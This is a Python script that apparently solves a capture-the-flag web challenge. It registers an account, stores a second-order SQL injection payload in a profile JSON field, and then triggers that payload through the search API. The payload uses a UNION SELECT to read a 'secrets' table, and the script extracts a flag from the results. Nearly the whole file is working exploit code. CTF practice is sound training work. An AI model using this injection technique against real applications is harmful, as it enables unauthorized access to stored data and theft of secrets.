import re
import sys
import time
import requests

def main():
    base_url = sys.argv[1].rstrip("/") if len(sys.argv) > 1 else "https://union-station.asrctf.online"
    session = requests.Session()
    
    username = "engineer{0}".format(int(time.time()))
    password = "relay456"
    
    # 1. Register
    register_response = session.post(
        base_url + "/register",
        data={"username": username, "password": password},
        timeout=5,
        allow_redirects=True,
    )
    register_response.raise_for_status()
    
    # 2. Update Search Profile JSON (Second-Order Injection Payload)
    payload_json = '{"connector": "OR body LIKE :term UNION SELECT 1, label, value FROM secrets--"}'
    update_response = session.post(
        base_url + "/update_profile",
        data={"profile_json": payload_json},
        timeout=5,
        allow_redirects=True,
    )
    update_response.raise_for_status()
    
    # 3. Trigger search via API to execute second-order SQL injection
    search_payload = {"term": "Relay"}
    search_response = session.post(
        base_url + "/api/search",
        json=search_payload,
        timeout=5
    )
    search_response.raise_for_status()
    search_results = search_response.json()
    
    # Check if there is an error in search results
    if "error" in search_results:
        raise SystemExit(f"SQL Injection error: {search_results['error']} | Query was: {search_results.get('query')}")
        
    # 4. Extract and print flag
    flag = None
    for row in search_results.get("rows", []):
        match = re.search(r"ASRCTF\{[^}]+\}", row.get("body", ""))
        if match:
            flag = match.group(0)
            break
            
    if not flag:
        raise SystemExit(f"Flag not found in search results: {search_results}")
        
    print(flag)

if __name__ == "__main__":
    main()
